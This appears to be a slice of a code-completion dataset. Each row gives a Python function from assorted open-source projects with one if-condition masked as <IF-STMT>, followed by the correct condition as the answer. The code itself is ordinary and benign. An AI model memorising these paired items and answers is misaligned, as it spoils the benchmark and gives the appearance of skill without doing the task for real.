3639,"def _list_shape_iter(shape):<tab>last_shape = _void<tab>for item in shape:<tab><tab><IF-STMT><tab><tab><tab>if last_shape is _void:<tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>""invalid shape spec: Ellipsis cannot be the"" ""first element""<tab><tab><tab><tab>)<tab><tab><tab>while True:<tab><tab><tab><tab>yield last_shape<tab><tab>last_shape = item<tab><tab>yield item",if item is Ellipsis :,109
3640,"def tokenize_url(self, field):<tab>field = field.strip()<tab>tokens = field.split("":"")<tab>offset = 0<tab>if tokens[0] == ""http"":<tab><tab>offset = 1<tab><tab>dstport = 80<tab><tab><IF-STMT><tab><tab><tab>inttokens = tokens[2].split(""/"")<tab><tab><tab>dstport = int(inttokens[0])<tab>elif tokens[0] == ""https"":<tab><tab>dstport = 443<tab>else:<tab><tab>if tokens[-1] is not None:<tab><tab><tab>dstport = int(tokens[-1])<tab>tld = tldextract.extract(tokens[offset])<tab>fqdn = ""."".join(part for part in tld if part)<tab>return (fqdn, dstport)",if len ( tokens ) > 2 :,183
3641,"def assert_summary_equals(self, records, tag, step, value):<tab>for record in records[1:]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if record.step != step:<tab><tab><tab>continue<tab><tab>self.assertEqual(value, tf.make_ndarray(record.summary.value[0].tensor))<tab><tab>return<tab>self.fail(""Could not find record for tag {} and step {}"".format(tag, step))",if record . summary . value [ 0 ] . tag != tag :,114
3642,"def getAttrDefault(key, fallback=None):<tab>try:<tab><tab>default = defaultValuesCache[key]<tab>except KeyError:<tab><tab>attrInfo = getAttributeInfo(key)<tab><tab><IF-STMT><tab><tab><tab>default = defaultValuesCache[key] = None<tab><tab>else:<tab><tab><tab>default = defaultValuesCache[key] = attrInfo.defaultValue<tab>if default is None:<tab><tab>default = fallback<tab>return default",if attrInfo is None :,107
3643,"def __getattr__(self, key):<tab>if key in self._raw:<tab><tab>val = self._raw[key]<tab><tab>if key in (""date"",):<tab><tab><tab>return pd.Timestamp(val)<tab><tab>elif key in (""open"", ""close""):<tab><tab><tab>return pd.Timestamp(val).time()<tab><tab><IF-STMT><tab><tab><tab>return pd.Timestamp(val[:2] + "":"" + val[-2:]).time()<tab><tab>else:<tab><tab><tab>return val<tab>return super().__getattr__(key)","elif key in ( ""session_open"" , ""session_close"" ) :",132
3644,"def _combine_to_jointcaller(processed):<tab>""""""Add joint calling information to variants, while collapsing independent regions.""""""<tab>by_vrn_file = collections.OrderedDict()<tab>for data in (x[0] for x in processed):<tab><tab>key = (<tab><tab><tab>tz.get_in((""config"", ""algorithm"", ""jointcaller""), data),<tab><tab><tab>data[""vrn_file""],<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>by_vrn_file[key] = []<tab><tab>by_vrn_file[key].append(data)<tab>out = []<tab>for grouped_data in by_vrn_file.values():<tab><tab>cur = grouped_data[0]<tab><tab>out.append([cur])<tab>return out",if key not in by_vrn_file :,187
3645,"def assign_type(self, wb_type):<tab>if isinstance(wb_type, ListType):<tab><tab>assigned_type = self.params[""element_type""].assign_type(<tab><tab><tab>wb_type.params[""element_type""]<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return ListType(assigned_type)<tab>return InvalidType()","if not isinstance ( assigned_type , InvalidType ) :",93
3646,"def set_billing_hours_and_amount(self):<tab>if not self.project:<tab><tab>for timesheet in self.timesheets:<tab><tab><tab>ts_doc = frappe.get_doc(""Timesheet"", timesheet.time_sheet)<tab><tab><tab>if not timesheet.billing_hours and ts_doc.total_billable_hours:<tab><tab><tab><tab>timesheet.billing_hours = ts_doc.total_billable_hours<tab><tab><tab><IF-STMT><tab><tab><tab><tab>timesheet.billing_amount = ts_doc.total_billable_amount",if not timesheet . billing_amount and ts_doc . total_billable_amount :,153
3647,"def add_changeset(repo_path, path_to_filename_in_archive):<tab>try:<tab><tab>subprocess.check_output(<tab><tab><tab>[""hg"", ""add"", path_to_filename_in_archive],<tab><tab><tab>stderr=subprocess.STDOUT,<tab><tab><tab>cwd=repo_path,<tab><tab>)<tab>except Exception as e:<tab><tab>error_message = ""Error adding '{}' to repository: {}"".format(<tab><tab><tab>path_to_filename_in_archive, unicodify(e)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>error_message += ""\nOutput was:\n%s"" % unicodify(e.output)<tab><tab>raise Exception(error_message)","if isinstance ( e , subprocess . CalledProcessError ) :",170
3648,"def full_path(self, *args, **query):<tab>""""""Return a full path""""""<tab>path = None<tab>if args:<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""full_url() takes exactly 1 argument "" ""(%s given)"" % len(args)<tab><tab><tab>)<tab><tab>path = args[0]<tab>if not path:<tab><tab>path = self.path<tab>elif not path.startswith(""/""):<tab><tab>path = remove_double_slash(""%s/%s"" % (self.path, path))<tab>return iri_to_uri(path, query)",if len ( args ) > 1 :,147
3649,"def retry_http_basic_auth(self, host, req, realm):<tab>user, pw = self.passwd.find_user_password(realm, host)<tab>if pw is not None:<tab><tab>raw = ""%s:%s"" % (user, pw)<tab><tab>auth = ""Basic %s"" % base64.b64encode(raw).strip()<tab><tab><IF-STMT><tab><tab><tab>return None<tab><tab>req.add_unredirected_header(self.auth_header, auth)<tab><tab>return self.parent.open(req, timeout=req.timeout)<tab>else:<tab><tab>return None","if req . get_header ( self . auth_header , None ) == auth :",159
3650,"def __call__(self, data):<tab>num_points = data.pos.shape[0]<tab>new_data = Data()<tab>for key in data.keys:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>item = data[key]<tab><tab>if torch.is_tensor(item) and num_points == item.shape[0]:<tab><tab><tab>item = item[self._indices].clone()<tab><tab>elif torch.is_tensor(item):<tab><tab><tab>item = item.clone()<tab><tab>setattr(new_data, key, item)<tab>return new_data",if key == KDTREE_KEY :,144
3651,def flat(tree):<tab>stack = [tree]<tab>result = []<tab>stack_pop = stack.pop<tab>stack_extend = stack.extend<tab>result_append = result.append<tab>while stack:<tab><tab>x = stack_pop()<tab><tab><IF-STMT><tab><tab><tab>result_append(x)<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>stack_extend(x)<tab><tab><tab>except TypeError:<tab><tab><tab><tab>result_append(x)<tab>return result[::-1],"if isinstance ( x , basestring ) :",126
3652,"def do_remove(self):<tab>if self.netconf.locked(""dhcp""):<tab><tab><IF-STMT><tab><tab><tab>pid = read_pid_file(""/var/run/dnsmasq.pan1.pid"")<tab><tab>else:<tab><tab><tab>pid = self.pid<tab><tab>if not kill(pid, ""dnsmasq""):<tab><tab><tab>logging.info(""Stale dhcp lockfile found"")<tab><tab>self.netconf.unlock(""dhcp"")",if not self . pid :,106
3653,"def set_xticklabels(self, labels=None, step=None, **kwargs):<tab>""""""Set x axis tick labels on the bottom row of the grid.""""""<tab>for ax in self.axes[-1, :]:<tab><tab><IF-STMT><tab><tab><tab>labels = [l.get_text() for l in ax.get_xticklabels()]<tab><tab><tab>if step is not None:<tab><tab><tab><tab>xticks = ax.get_xticks()[::step]<tab><tab><tab><tab>labels = labels[::step]<tab><tab><tab><tab>ax.set_xticks(xticks)<tab><tab>ax.set_xticklabels(labels, **kwargs)<tab>return self",if labels is None :,145
3654,"def _resolved_values(self):<tab>values = []<tab>for k, v in self.values.items() if hasattr(self.values, ""items"") else self.values:<tab><tab>if self.mapper:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>desc = _entity_descriptor(self.mapper, k)<tab><tab><tab><tab>values.extend(desc._bulk_update_tuples(v))<tab><tab><tab>elif isinstance(k, attributes.QueryableAttribute):<tab><tab><tab><tab>values.extend(k._bulk_update_tuples(v))<tab><tab><tab>else:<tab><tab><tab><tab>values.append((k, v))<tab><tab>else:<tab><tab><tab>values.append((k, v))<tab>return values","if isinstance ( k , util . string_types ) :",176
3655,"def _print_handles(self, text, handle_list):<tab>for handle in handle_list:<tab><tab>source, citation = self.get_source_or_citation(handle, False)<tab><tab>_LOG.debug(""\n\n\n"")<tab><tab><IF-STMT><tab><tab><tab>_LOG.debug(""---- %s -- source %s"" % (text, source.get_title()))<tab><tab>elif citation:<tab><tab><tab>_LOG.debug(""---- %s -- citation %s"" % (text, citation.get_page()))<tab><tab>else:<tab><tab><tab>_LOG.debug(""---- %s -- handle %s"" % (text, handle))",if source :,161
3656,"def test_items(self):<tab>expectException = (<tab><tab>len(self.sparse_data) < len(self.data)<tab><tab>and not self.instance.A._default_val is None<tab>)<tab>try:<tab><tab>test = self.instance.A.items()<tab><tab># self.assertEqual( type(test), list )<tab><tab><IF-STMT><tab><tab><tab>self.validateDict(self.sparse_data.items(), test)<tab><tab>else:<tab><tab><tab>self.validateDict(self.data.items(), test)<tab><tab># self.assertFalse(expectException)<tab>except ValueError:<tab><tab>if not expectException:<tab><tab><tab>raise",if self . instance . A . _default_val is None :,168
3657,"def __new__(cls, name, bases, d):<tab>rv = type.__new__(cls, name, bases, d)<tab>if ""methods"" not in d:<tab><tab>methods = set(rv.methods or [])<tab><tab>for key, value in d.iteritems():<tab><tab><tab>if key in http_method_funcs:<tab><tab><tab><tab>methods.add(key.upper())<tab><tab># if we have no method at all in there we don't want to<tab><tab># add a method list.  (This is for instance the case for<tab><tab># the baseclass or another subclass of a base method view<tab><tab># that does not introduce new methods).<tab><tab><IF-STMT><tab><tab><tab>rv.methods = sorted(methods)<tab>return rv",if methods :,172
3658,"def getResultSummary(self):<tab>if self.descriptionDone is not None or self.description is not None:<tab><tab>stepsumm = util.join_list(self.descriptionDone or self.description)<tab><tab><IF-STMT><tab><tab><tab>stepsumm += u"" "" + util.join_list(self.descriptionSuffix)<tab>else:<tab><tab>stepsumm = u""finished""<tab>if self.results != SUCCESS:<tab><tab>stepsumm += u"" (%s)"" % Results[self.results]<tab>return {u""step"": stepsumm}",if self . descriptionSuffix :,137
3659,"def analyze_items(items, category_id, agg_data):<tab>for item in items:<tab><tab>if not agg_data[""cat_asp""].get(category_id, None):<tab><tab><tab>agg_data[""cat_asp""][category_id] = []<tab><tab>agg_data[""cat_asp""][category_id].append(<tab><tab><tab>float(item.sellingStatus.currentPrice.value)<tab><tab>)<tab><tab>if getattr(item.listingInfo, ""watchCount"", None):<tab><tab><tab>agg_data[""watch_count""] += int(item.listingInfo.watchCount)<tab><tab><IF-STMT><tab><tab><tab>agg_data[""postal_code""] = item.postalCode","if getattr ( item , ""postalCode"" , None ) :",169
3660,"def _Determine_Do(self):<tab>from os.path import join<tab>self.applicable = 1<tab>siloedPythonInstallDir = black.configure.items[""siloedPythonInstallDir""].Get()<tab>if sys.platform == ""darwin"":<tab><tab>siloedPyVer = black.configure.items[""siloedPyVer""].Get()<tab><tab>self.value = join(<tab><tab><tab>siloedPythonInstallDir, ""Python.framework"", ""Versions"", siloedPyVer, ""bin""<tab><tab>)<tab>else:<tab><tab>self.value = siloedPythonInstallDir<tab><tab><IF-STMT><tab><tab><tab>self.value = join(self.value, ""bin"")<tab>self.determined = 1","if sys . platform != ""win32"" :",177
3661,"def work(self):<tab>idle_times = 0<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>log.info(""Stop sync worker"")<tab><tab><tab>break<tab><tab>try:<tab><tab><tab>job = self.commit_queue.get(timeout=self.timeout, block=True)<tab><tab><tab>if job[""type""] == ""commit"":<tab><tab><tab><tab>self.commits.append(job)<tab><tab><tab>log.debug(""Got a commit job"")<tab><tab><tab>idle_times = 0<tab><tab><tab>idle.clear()<tab><tab>except Empty:<tab><tab><tab>log.debug(""Nothing to do right now, going idle"")<tab><tab><tab>if idle_times > self.min_idle_times:<tab><tab><tab><tab>idle.set()<tab><tab><tab>idle_times += 1<tab><tab><tab>self.on_idle()",if shutting_down . is_set ( ) :,200
3662,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_module(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_version(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_instances(d.getVarInt64())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,150
3663,"def expand_group(client: Any, group_key: str):<tab>""""""Determines if an email is really a dl.""""""<tab># NOTE: Google Groups does not support other DLs as Group owners<tab># https://stackoverflow.com/questions/31552146/group-as-owner-or-manager-fails-with-400-error<tab>try:<tab><tab>response = list_members(client, group_key, propagate_errors=True)<tab><tab>if response.get(""members""):<tab><tab><tab>return [x[""email""] for x in response.get(""members"", [])]<tab>except HttpError as e:<tab><tab><IF-STMT><tab><tab><tab>pass<tab>return []",if e . resp . status == 404 :,162
3664,"def validate_against_domain(<tab>cls, ensemble: Optional[""PolicyEnsemble""], domain: Optional[Domain]) -> None:<tab>if ensemble is None:<tab><tab>return<tab>for p in ensemble.policies:<tab><tab>if not isinstance(p, TwoStageFallbackPolicy):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise InvalidDomain(<tab><tab><tab><tab>""The intent '{0}' must be present in the ""<tab><tab><tab><tab>""domain file to use TwoStageFallbackPolicy. ""<tab><tab><tab><tab>""Either include the intent '{0}' in your domain ""<tab><tab><tab><tab>""or exclude the TwoStageFallbackPolicy from your ""<tab><tab><tab><tab>""policy configuration"".format(p.deny_suggestion_intent_name)<tab><tab><tab>)",if domain is None or p . deny_suggestion_intent_name not in domain . intents :,195
3665,"def _ndvi(nir_data, red_data):<tab>out = np.zeros_like(nir_data)<tab>rows, cols = nir_data.shape<tab>for y in range(0, rows):<tab><tab>for x in range(0, cols):<tab><tab><tab>nir = nir_data[y, x]<tab><tab><tab>red = red_data[y, x]<tab><tab><tab><IF-STMT>  # cover zero divison case<tab><tab><tab><tab>continue<tab><tab><tab>soma = nir + red<tab><tab><tab>out[y, x] = (nir - red) / soma<tab>return out",if nir == red :,154
3666,"def sysroot():<tab>cmd = ""set sysroot remote:/""<tab>if is_android():<tab><tab><IF-STMT><tab><tab><tab>gdb.execute(cmd)<tab><tab>else:<tab><tab><tab>print(message.notice(""sysroot is already set, skipping %r"" % cmd))","if gdb . parameter ( ""sysroot"" ) == ""target:"" :",77
3667,"def _run(self):<tab>when_pressed = 0.0<tab>pressed = False<tab>while not self._done.is_set():<tab><tab>now = time.monotonic()<tab><tab>if now - when_pressed > self._debounce_time:<tab><tab><tab>if GPIO.input(self._channel) == self._expected:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>pressed = True<tab><tab><tab><tab><tab>when_pressed = now<tab><tab><tab><tab><tab>self._trigger(self._pressed_queue, self._pressed_callback)<tab><tab><tab>else:<tab><tab><tab><tab>if pressed:<tab><tab><tab><tab><tab>pressed = False<tab><tab><tab><tab><tab>self._trigger(self._released_queue, self._released_callback)<tab><tab>self._done.wait(0.05)",if not pressed :,187
3668,"def find_comment(line):<tab>""""""Finds the index of a comment # and returns None if not found""""""<tab>instring, instring_char = False, """"<tab>for i, char in enumerate(line):<tab><tab>if char in ('""', ""'""):<tab><tab><tab>if instring:<tab><tab><tab><tab>if char == instring_char:<tab><tab><tab><tab><tab>instring = False<tab><tab><tab><tab><tab>instring_char = """"<tab><tab><tab>else:<tab><tab><tab><tab>instring = True<tab><tab><tab><tab>instring_char = char<tab><tab><IF-STMT><tab><tab><tab>if not instring:<tab><tab><tab><tab>return i<tab>return None","elif char == ""#"" :",155
3669,"def _deduplicate_data(self):<tab># Remove duplicate entries, without recreating self.data object<tab>dup_lines = []<tab>hash_set = set()<tab>for i, fields in enumerate(self.data):<tab><tab>fields_hash = hash(self.separator.join(fields))<tab><tab><IF-STMT><tab><tab><tab>dup_lines.append(i)<tab><tab><tab>log.debug(<tab><tab><tab><tab>'Found duplicate entry in tool data table ""%s"", but duplicates are not allowed, removing additional entry for: ""%s""',<tab><tab><tab><tab>self.name,<tab><tab><tab><tab>fields,<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>hash_set.add(fields_hash)<tab>for i in reversed(dup_lines):<tab><tab>self.data.pop(i)",if fields_hash in hash_set :,194
3670,"def sample_independent(<tab>self,<tab>study: Study,<tab>trial: FrozenTrial,<tab>param_name: str,<tab>param_distribution: distributions.BaseDistribution,) -> Any:<tab>self._raise_error_if_multi_objective(study)<tab>if self._warn_independent_sampling:<tab><tab>complete_trials = self._get_trials(study)<tab><tab><IF-STMT><tab><tab><tab>self._log_independent_sampling(trial, param_name)<tab>return self._independent_sampler.sample_independent(<tab><tab>study, trial, param_name, param_distribution<tab>)",if len ( complete_trials ) >= self . _n_startup_trials :,158
3671,"def publish(self):<tab>""""""Publish new events to the subscribers.""""""<tab>while True:<tab><tab>event = await self.event_source.get()<tab><tab>str_buffer = []<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>if isinstance(event, str):<tab><tab><tab>str_buffer.append(event)<tab><tab>elif event.type == EventTypes.BLOCK_VALID:<tab><tab><tab>str_buffer = map(json.dumps, eventify_block(event.data))<tab><tab>for str_item in str_buffer:<tab><tab><tab>for _, websocket in self.subscribers.items():<tab><tab><tab><tab>await websocket.send_str(str_item)",if event == POISON_PILL :,164
3672,"def push(self):<tab>advice = self.check()<tab>if not self._context[""silent""]:<tab><tab>if not self.hasPendingSync(advice):<tab><tab><tab>print(""No changes to push."")<tab><tab><tab>return<tab><tab>choice = input(""Continue? y/N:"")<tab><tab><IF-STMT><tab><tab><tab>print(""Aborted on user command"")<tab><tab><tab>return<tab>print(""push local changes to remote..."")<tab>self._publish.syncRemote(self._context[""srcroot""], advice)","if choice != ""y"" :",123
3673,"def readline(self, limit=-1):<tab>i = self._rbuf.find(""\n"")<tab>while i < 0 and not (0 < limit <= len(self._rbuf)):<tab><tab>new = self._raw_read(self._rbufsize)<tab><tab>if not new:<tab><tab><tab>break<tab><tab>i = new.find(""\n"")<tab><tab><IF-STMT><tab><tab><tab>i += len(self._rbuf)<tab><tab>self._rbuf = self._rbuf + new<tab>if i < 0:<tab><tab>i = len(self._rbuf)<tab>else:<tab><tab>i += 1<tab>if 0 <= limit < len(self._rbuf):<tab><tab>i = limit<tab>data, self._rbuf = self._rbuf[:i], self._rbuf[i:]<tab>return data",if i >= 0 :,194
3674,"def main():<tab>init_app(set_backends=True, routes=False)<tab>dry_run = ""--dry"" in sys.argv<tab>if not dry_run:<tab><tab>script_utils.add_file_logger(logger, __file__)<tab>with transaction.atomic():<tab><tab>normalize_source_tags()<tab><tab>add_claimed_tags()<tab><tab>add_osf_provider_tags()<tab><tab>add_prereg_campaign_tags()<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""Dry run, transaction rolled back"")",if dry_run :,136
3675,"def iter_segments(self):<tab>while not self.closed:<tab><tab>for chunk in filter(self.valid_chunk, self.chunks):<tab><tab><tab>self.logger.debug(""Adding chunk {0} to queue"", chunk.num)<tab><tab><tab>yield chunk<tab><tab><tab># End of stream<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab><tab>self.chunk_id = chunk.num + 1<tab><tab>if self.wait(self.module_info_reload_time):<tab><tab><tab>try:<tab><tab><tab><tab>self.process_module_info()<tab><tab><tab>except StreamError as err:<tab><tab><tab><tab>self.logger.warning(""Failed to process module info: {0}"", err)",if self . closed :,169
3676,"def SetItems(self, choices):<tab>self.choices = choices<tab>self.choice_names = self.get_choice_names()<tab>self.list_dlg.SetItems(self.get_choice_labels())<tab>labels = self.get_choice_labels()<tab>for i in range(len(self.choices)):<tab><tab>if self.choices[i][1] is None:<tab><tab><tab># Tag missing items<tab><tab><tab>self.list_dlg.SetItemBackgroundColour(i, ""pink"")<tab><tab><IF-STMT><tab><tab><tab># Tag duplicated items<tab><tab><tab>self.list_dlg.SetItemForegroundColour(i, ""grey"")<tab># on Mac, changing the items clears the current selection<tab>self.SetChecked(self.checked)<tab>self.Refresh()","elif labels [ i ] . endswith ( ""Name!)"" ) :",192
3677,"def combine_logs(audit_logs, statement_text_logs):<tab>for audit_transaction in audit_logs:<tab><tab>for audit_query in audit_logs[audit_transaction]:<tab><tab><tab>matching_statement_text_logs = statement_text_logs.get(hash(audit_query))<tab><tab><tab>if matching_statement_text_logs:<tab><tab><tab><tab>statement_text_log = matching_statement_text_logs.pop()<tab><tab><tab><tab>if statement_text_log:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>audit_query.start_time = statement_text_log.start_time<tab><tab><tab><tab><tab>if statement_text_log.end_time:<tab><tab><tab><tab><tab><tab>audit_query.end_time = statement_text_log.end_time",if statement_text_log . start_time :,197
3678,"def handle_data(self, data):<tab>if self.in_span or self.in_div:<tab><tab>if data == ""No such user (please note that login is case sensitive)"":<tab><tab><tab>self.no_user = True<tab><tab><IF-STMT><tab><tab><tab>self.bad_pw = True<tab><tab>elif data == ""User with that email already exists"":<tab><tab><tab>self.already_exists = True","elif data == ""Invalid password"" :",101
3679,"def K(exp):<tab>""Helper function to specify keymap""<tab>import re<tab>modifier_strs = []<tab>while True:<tab><tab>m = re.match(r""\A(C|Ctrl|M|Alt|Shift|Super|Win)-"", exp)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>modifier = m.group(1)<tab><tab>modifier_strs.append(modifier)<tab><tab>exp = re.sub(r""\A{}-"".format(modifier), """", exp)<tab>key_str = exp.upper()<tab>key = getattr(Key, key_str)<tab>return Combo(create_modifiers_from_strings(modifier_strs), key)",if m is None :,161
3680,"def local_min(self, hmap):<tab>rows = len(hmap)<tab>cols = len(hmap[0])<tab>min_list = []<tab>for row in range(rows):<tab><tab>for col in range(cols):<tab><tab><tab>for d_row, d_col in ((1, 0), (0, 1), (-1, 0), (0, -1)):<tab><tab><tab><tab>h_row = (row + d_row) % rows<tab><tab><tab><tab>h_col = (col + d_col) % cols<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab>else:<tab><tab><tab><tab>min_list.append((row, col))<tab>return min_list",if hmap [ h_row ] [ h_col ] < hmap [ row ] [ col ] :,186
3681,"def _check_processing(self):<tab>now = time.time()<tab>self.mutex.acquire()<tab>while (<tab><tab>self.processing.qsize()<tab><tab>and self.processing.top<tab><tab>and self.processing.top.exetime < now<tab>):<tab><tab>task = self.processing.get_nowait()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>task.exetime = 0<tab><tab>self.priority_queue.put(task)<tab><tab>logger.info(""processing: retry %s"", task.taskid)<tab>self.mutex.release()",if task . taskid is None :,143
3682,"def autoname(self):<tab>naming_method = frappe.db.get_value(""HR Settings"", None, ""emp_created_by"")<tab>if not naming_method:<tab><tab>throw(_(""Please setup Employee Naming System in Human Resource > HR Settings""))<tab>else:<tab><tab>if naming_method == ""Naming Series"":<tab><tab><tab>set_name_by_naming_series(self)<tab><tab><IF-STMT><tab><tab><tab>self.name = self.employee_number<tab><tab>elif naming_method == ""Full Name"":<tab><tab><tab>self.set_employee_name()<tab><tab><tab>self.name = self.employee_name<tab>self.employee = self.name","elif naming_method == ""Employee Number"" :",169
3683,"def __fixdict(self, dict):<tab>for key in dict.keys():<tab><tab>if key[:6] == ""start_"":<tab><tab><tab>tag = key[6:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab>if start is None:<tab><tab><tab><tab>self.elements[tag] = getattr(self, key), end<tab><tab>elif key[:4] == ""end_"":<tab><tab><tab>tag = key[4:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.elements[tag] = start, getattr(self, key)",if end is None :,162
3684,"def parseAGL(filename):  # -> { 2126: 'Omega', ... }<tab>m = {}<tab>for line in readLines(filename):<tab><tab># Omega;2126<tab><tab># dalethatafpatah;05D3 05B2   # higher-level combinations; ignored<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>name, uc = tuple([c.strip() for c in line.split("";"")])<tab><tab><tab>if uc.find("" "") == -1:<tab><tab><tab><tab># it's a 1:1 mapping<tab><tab><tab><tab>m[int(uc, 16)] = name<tab>return m","if len ( line ) > 0 and line [ 0 ] != ""#"" :",169
3685,"def password(self, password):<tab>self._password = password<tab>if password:<tab><tab><IF-STMT><tab><tab><tab>self.eeprint(<tab><tab><tab><tab>""Install sshpass to using password: https://duckduckgo.com/?q=install+sshpass\n""<tab><tab><tab><tab>+ ""Note! There are a lot of security reasons to stop using password auth.""<tab><tab><tab>)<tab><tab>verbose = ""-v"" if ""-v"" in self.sshpass else []<tab><tab>self.sshpass = [""sshpass"", ""-p"", password] + verbose<tab>else:<tab><tab>self.sshpass = []","if not which ( ""sshpass"" ) :",147
3686,"def test_region_redirects_multiple_requests(self):<tab>try:<tab><tab>response = self.client.list_objects(Bucket=self.bucket_name)<tab><tab>self.assertEqual(response[""ResponseMetadata""][""HTTPStatusCode""], 200)<tab><tab>second_response = self.client.list_objects(Bucket=self.bucket_name)<tab><tab>self.assertEqual(second_response[""ResponseMetadata""][""HTTPStatusCode""], 200)<tab>except ClientError as e:<tab><tab>error = e.response[""Error""].get(""Code"", None)<tab><tab><IF-STMT><tab><tab><tab>self.fail(""S3 client failed to redirect to the proper region."")","if error == ""PermanentRedirect"" :",148
3687,"def get_action_type(action_space):<tab>""""""Method to get the action type to choose prob. dist. to sample actions from NN logits output""""""<tab>if isinstance(action_space, spaces.Box):<tab><tab>shape = action_space.shape<tab><tab>assert len(shape) == 1<tab><tab><IF-STMT><tab><tab><tab>return ""continuous""<tab><tab>else:<tab><tab><tab>return ""multi_continuous""<tab>elif isinstance(action_space, spaces.Discrete):<tab><tab>return ""discrete""<tab>elif isinstance(action_space, spaces.MultiDiscrete):<tab><tab>return ""multi_discrete""<tab>elif isinstance(action_space, spaces.MultiBinary):<tab><tab>return ""multi_binary""<tab>else:<tab><tab>raise NotImplementedError",if shape [ 0 ] == 1 :,177
3688,def remove_stale_sockets(self):<tab>with self.lock:<tab><tab><IF-STMT><tab><tab><tab>for sock_info in self.sockets.copy():<tab><tab><tab><tab>age = _time() - sock_info.last_checkout<tab><tab><tab><tab>if age > self.opts.max_idle_time_ms:<tab><tab><tab><tab><tab>self.sockets.remove(sock_info)<tab><tab><tab><tab><tab>sock_info.close()<tab>while len(self.sockets) + self.active_sockets < self.opts.min_pool_size:<tab><tab>sock_info = self.connect()<tab><tab>with self.lock:<tab><tab><tab>self.sockets.add(sock_info),if self . opts . max_idle_time_ms is not None :,176
3689,"def _setReadyState(self, state: str) -> None:<tab>if state != self.__readyState:<tab><tab>self.__log_debug(""- %s -> %s"", self.__readyState, state)<tab><tab>self.__readyState = state<tab><tab>if state == ""open"":<tab><tab><tab>self.emit(""open"")<tab><tab><IF-STMT><tab><tab><tab>self.emit(""close"")<tab><tab><tab># no more events will be emitted, so remove all event listeners<tab><tab><tab># to facilitate garbage collection.<tab><tab><tab>self.remove_all_listeners()","elif state == ""closed"" :",131
3690,"def currentLevel(self):<tab>currentStr = """"<tab>for stackType, stackValue in self.stackVals:<tab><tab><IF-STMT><tab><tab><tab>if isinstance(stackValue, str):<tab><tab><tab><tab>currentStr += ""['"" + stackValue + ""']""<tab><tab><tab>else:  # numeric key...<tab><tab><tab><tab>currentStr += ""["" + str(stackValue) + ""]""<tab><tab>elif stackType == ""listLike"":<tab><tab><tab>currentStr += ""["" + str(stackValue) + ""]""<tab><tab>elif stackType == ""getattr"":<tab><tab><tab>currentStr += "".__getattribute__('"" + stackValue + ""')""<tab><tab>else:<tab><tab><tab>raise Exception(f""Cannot get attribute of type {stackType}"")<tab>return currentStr","if stackType == ""dict"" :",176
3691,def filter_latest_pkgs(pkgs):<tab>pkgname2latest = {}<tab>for x in pkgs:<tab><tab>pkgname = core.normalize_pkgname(x.pkgname)<tab><tab><IF-STMT><tab><tab><tab>pkgname2latest[pkgname] = x<tab><tab>elif x.parsed_version > pkgname2latest[pkgname].parsed_version:<tab><tab><tab>pkgname2latest[pkgname] = x<tab>return pkgname2latest.values(),if pkgname not in pkgname2latest :,103
3692,"def test_url_invalid_set():<tab>for line in URL_INVALID_TESTS.split(""\n""):<tab><tab># strip line, skip over empty lines<tab><tab>line = line.strip()<tab><tab>if line == """":<tab><tab><tab>continue<tab><tab># skip over comments<tab><tab>match = COMMENT.match(line)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>mbox = address.parse(line, strict=True)<tab><tab>assert_equal(mbox, None)",if match :,115
3693,"def check_block(cls, block):<tab>if (<tab><tab>len(block) == 4<tab><tab>and block[0][0]<tab><tab>and block[0][0][0] == ""@""<tab><tab>and block[2][0]<tab><tab>and block[2][0][0] == ""+""<tab><tab>and block[1][0]<tab>):<tab><tab># Check the sequence line, make sure it contains only G/C/A/T/N<tab><tab>match = cls.bases_regexp.match(block[1][0])<tab><tab><IF-STMT><tab><tab><tab>start, end = match.span()<tab><tab><tab>if (end - start) == len(block[1][0]):<tab><tab><tab><tab>return True<tab>return False",if match :,174
3694,"def load_from_file(self, filename):<tab>self._filename = filename<tab>if os.path.exists(filename):<tab><tab><IF-STMT><tab><tab><tab>raise IOError(""%s exists and is not a file"" % filename)<tab><tab>with open(filename, ""r"") as f:<tab><tab><tab>self._properties = json.load(f)<tab>else:<tab><tab>mkpath(os.path.dirname(filename))<tab><tab>self.save_to_file()",if not os . path . isfile ( filename ) :,118
